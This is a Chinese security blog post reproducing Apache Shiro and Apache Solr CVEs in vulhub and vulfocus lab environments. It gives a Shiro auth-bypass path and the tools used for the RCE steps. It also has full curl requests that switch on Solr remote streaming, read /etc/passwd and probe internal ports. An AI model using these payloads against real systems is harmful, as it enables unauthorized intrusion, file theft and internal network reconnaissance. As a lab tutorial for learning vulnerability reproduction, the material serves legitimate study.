#  框架漏洞-CVE复现-Apache Shiro+Apache Solr   
原创 兰陵猪猪哼  小黑子安全   2024-04-13 09:11  
  
什么是框架？  
  
   
就是别人写好包装起来的一套工具，把你原先必须要写的，必须要做的一些复杂的东西都写好了放在那里，你只要调用他的方法，就可以实现一些本来要费好大劲的功能。  
  
   
如果网站的功能是采用框架开发的  
，那么挖掘功能的漏洞就相当于在挖掘框架自身的漏洞。如果框架产生漏洞也会对使用框架的网站产生影响。  
  
常见语言开发框架：  
  
PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等  
  
JAVA：Spring MyBatis Hibernate Struts2 Springboot等  
  
Python：Django Flask Bottle Turbobars Tornado Web2py等  
  
Javascript：Vue.js Node.js Bootstrap JQuery Angular等  
  
Apache Shiro-组件框架安全  
  
描述：Apache
Shiro是一个强大且易用的Java安全框架，用于身份验证、授权、密码和会话管理。  
  
判断：大多会发生在登录处，返回包里包含remeberMe=deleteMe字段。  
  
漏洞复现：  
Shiro <= 1.2.4   
默认密钥致命令执行漏洞（  
CVE_2016_4437  
）  
  
描述：该漏洞源于程序未能正确配置  
&lsquo;remember me&rsquo;  
功能使用的密钥。攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。  
  
影响版本：  
Apache Shiro 1.0.0  
版本至  
1.2.4  
版本中存在信息泄露漏洞  
  
使用  
vulfocus  
靶场启动环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVJgmbzjBfTWaDduLveWxyUJLtnQbhSCANgSXYcsxrpa6La9sQGMEGsQ/640?wx_fmt=png&from=appmsg "")  
  
直接使用工具利用漏洞  
  
工具：  
https://github.com/ghealer/GUI_Tools  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVf7Hq41LH779BVb2z7icWPiaYkppObDp1XlAW1LqO9TxBGf8jNbfQS7LA/640?wx_fmt=png&from=appmsg "")  
  
输入目标  
url  
开始检测漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEV9pVnsicic5QVmj5pgwJYWvY4E5dI87TbQiafSy9a8ahRTc4EXayfz5icJQ/640?wx_fmt=png&from=appmsg "")  
  
成功获取利用链之后执行命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVELN15Z6icqUqE9MiajEpYxFNlPQlUPeSQrXXyfGkod9gQb11lbTEZV9A/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现：  
Shiro < 1.5.2   
验证绕过漏洞  
(  
CVE-2020-1957  
)  
  
描述：  
Shiro  
框架通过拦截器功能来对用户访问权限进行控制，如  
anon, authc  
等拦截器。  
anon  
为匿名拦截器，不需要登录即可访问；  
authc  
为登录拦截器，需要登录才可以访问。主要是  
Spring web  
在匹配  
url  
的时候没有匹配上  
/  
导致绕过  
  
使用  
vulhub  
靶场启动环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEV9eP6L7fiahkwLoCdjNlTmNsH16KtumeAZNGOQVkmD5QTWw9x6nKycFA/640?wx_fmt=png&from=appmsg "")  
  
点击  
login  
和  
Accout info  
都会跳转到如下登录验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVqr5JWYYtvbCB969fNIzxpmsiaKTI0QKTANXnJYtWLGc9yJicrfaricAow/640?wx_fmt=png&from=appmsg "")  
  
直接访问  
poc  
：  
/xxx/..;/admin/  
   
绕过验证，进入后台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEV1ZekqJmnh5m6NxhNdnEDAbHIoGibjic9f3a5VAWiaO1mPyyPsr2lAAJ2g/640?wx_fmt=png&from=appmsg "")  
  
Apache Solr-组件框架安全  
  
描述：Apache
Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache
Lucene实现的。Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。  
  
漏洞复现：solr 远程命令执行 (CVE-2019-17558)  
  
描述：  
Apache Solr 5.0.0  
版本至  
8.3.1  
版本中存在输入验证错误漏洞。攻击者可借助自定义的  
Velocity  
模板功能，利用  
Velocity-SSTI  
漏洞在  
Solr  
系统上执行任意代码。  
  
使用  
vulfocus  
靶场启动环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVZP8rlpw9jjknv1jnThD9WY8xjWsWUR9ibib9SePF6dzeptK21zwNvuKw/640?wx_fmt=png&from=appmsg "")  
  
直接使用漏洞利用工具检测  
  
工具：https  
://  
github  
.  
com  
/  
jas502n  
/  
solr_rce  
  
输入命令：  
python solr_rce.py   
http://  
目标  
ip:  
端口  
 要执行的命令  
  
使用  
python2  
运行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVzRyAgOkSVKb91PMk7sCOWbwsm2fUSpW1WOVIKstzUq2JjMFMApFQog/640?wx_fmt=png&from=appmsg "")  
  
成功执行命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVyic2xxump7rfvCgqpzHN4BxKubJuick2KNhx4vqBiaUic8WP2MnmckjAmg/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现：Apache
Solr文件读取&SSRF (CVE-2021-27905)  
  
描述：  
Apache Solr  
的某些功能存在过滤不严格，在  
Apache Solr  
未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成  
SSRF  
或文件读取漏洞。  
  
影响版本：全版本官方拒绝修复漏洞  
  
1.  
使用  
vulhub  
靶场启动环境，  
点击  
core
admin   
创建数据库。因为是靶场，需要自己创建  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVUQhdt6A6eCs4KibeEM1EQuLHmAByGw2t0MIo0oRcacvJibykuIeWccicw/640?wx_fmt=png&from=appmsg "")  
  
2.  
创建完成，访问：  
/solr/admin/cores?indexInfo=false&wt=json  
    
获取数据库名  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVByCzIcKJ62l5FNqlASadcm7AN97b2xY3b2IWQJ0icYVFGXhKSZwCJEQ/640?wx_fmt=png&from=appmsg "")  
  
3.  
通过命令行开启远程任意文件读取  
  
命令行执行命令：  
  
curl -i -s -k -X $'POST' \  
  
-H $'Content-Type: application/json'
--data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \  
  
$'http://目标  
ip:  
端口/solr/数据库名/config'  
  
成功开启：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVLT2UO4stF4ybQwmmA3iafMRtNicYsHF5icVOknPqibq1Lkhv9Gsicib9NDdQ/640?wx_fmt=png&from=appmsg "")  
  
4.  
读取敏感文件  
  
命令行执行命令：  
curl -i -s -k '  
http://  
目标  
ip:  
端口/solr/数据库名/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd  
'  
  
成功读取敏感文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVDTIzLOKYuss007vTIWV11jNo2yfQUWRPUl52eZAlyY9N3TVzeWiclicw/640?wx_fmt=png&from=appmsg "")  
  
5.  
内网探针  
  
命令行执行命令：  
curl -i -s -k '  
http://  
目标  
ip:  
端口  
/solr/  
数据库名  
/debug/dump?param=ContentStreams&stream.url=http://127.0.0.1:80  
'  
  
成功探针到目标内网  
80  
端口信息：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVuh4JSe6fwicnibqkPo455y10YjMCRWqZOYfXdw1m2VxIfAoxRH4epeQA/640?wx_fmt=png&from=appmsg "")  
  
查看返回信息，发现在  
80  
端口部署了  
nginx  
服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVQHZHpODqrAmEcVJgIYBBjlTuteSvRgGviacJnicrEooiblmV0ibxIUvtcg/640?wx_fmt=png&from=appmsg "")  
  
网络安全技术交流群：wx加我好友，备注“进群”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9ibb0kbHCImS2ldibAAaXVDGRKsYsrwDjQmnYKiauv2Vz2eknbKu3CoVokgYhb09xbGUpBxLqSVsdJBDmic1oiclmA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
QQ群：708769345  
  
  
